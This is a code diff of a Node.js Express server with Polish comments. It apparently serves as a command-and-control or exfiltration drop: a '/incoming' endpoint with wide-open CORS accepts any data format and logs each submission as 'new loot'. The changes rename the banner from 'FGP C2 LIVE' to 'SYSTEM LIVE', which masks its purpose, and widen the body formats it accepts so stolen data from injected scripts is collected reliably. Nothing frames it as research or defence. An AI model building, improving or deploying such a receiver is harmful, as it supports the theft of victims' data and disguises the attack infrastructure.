@@ -2,20 +2,23 @@ const express = require('express');
 const cors = require('cors');
 const app = express();
 
+// 1. Pełny CORS (akceptuje wszystko)
 app.use(cors());
+// 2. Obsługa każdego formatu danych
 app.use(express.json());
 app.use(express.text({ type: '*/*' }));
+app.use(express.urlencoded({ extended: true }));
 
-// Punkt dla Render Health Check (zostawiamy bez zmian)
 app.get('/healthz', (req, res) => res.sendStatus(200));
 
-// POPRAWKA: Tutaj musi być tylko '/incoming', a nie pełny link!
+// 3. Główny odbiornik
 app.post('/incoming', (req, res) => {
-    console.log(`\n\x1b[41m[ ALERT: NOWY ŁUP ]\x1b[0m`);
+    console.log(`\n\x1b[41m[ !!! ALERT: NOWY ŁUP !!! ]\x1b[0m`);
     console.log(`GODZINA: ${new Date().toLocaleTimeString()}`);
-    console.log(`DANE:`, req.body);
-    res.status(200).send("Dostarczono");
+    // Wyświetla body niezależnie od formatu
+    console.log(`DANE:`, req.body); 
+    res.status(200).send("OK");
 });
 
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log(`FGP C2 LIVE ON PORT ${PORT}`));
+app.listen(PORT, () => console.log(`SYSTEM LIVE ON PORT ${PORT}`));
